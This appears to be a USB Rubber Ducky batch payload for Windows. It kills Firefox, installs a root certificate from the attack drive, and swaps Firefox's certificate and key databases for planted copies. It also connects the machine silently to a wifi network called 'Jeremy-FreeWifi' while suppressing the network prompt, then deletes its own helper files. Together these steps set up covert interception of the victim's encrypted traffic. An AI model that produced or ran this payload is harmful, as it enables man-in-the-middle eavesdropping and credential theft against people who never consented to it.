taskkill /IM Firefox.exe /F
copy /Y %DUCKYdrive%\cert.cer %USERPROFILE%\cert.cer
certutil -addstore -f -enterprise -user root cert.cer
cd %APPDATA%\Mozilla\Firefox\Profiles\*.default
copy /Y cert8.db cert8.db.original
copy /Y %DUCKYdrive%\cert8.db cert8.db
copy /Y key3.db key3.db.original
copy /Y %DUCKYdrive%\key3.db key3.db
cd %USERPROFILE%
del cert.cer
:: **Requires Admin Rights**
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff /f
netsh wlan add profile filename="%DUCKYdrive%\a.xml" interface="Wireless Network Connection"
netsh wlan connect name=Jeremy-FreeWifi
:: **Requires Admin Rights**
REG DELETE HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Network\NewNetworkWindowOff /f
del invis.vbs
del DuckyWait.bat
timeout /t 2 /nobreak
taskkill /IM cmd.exe /F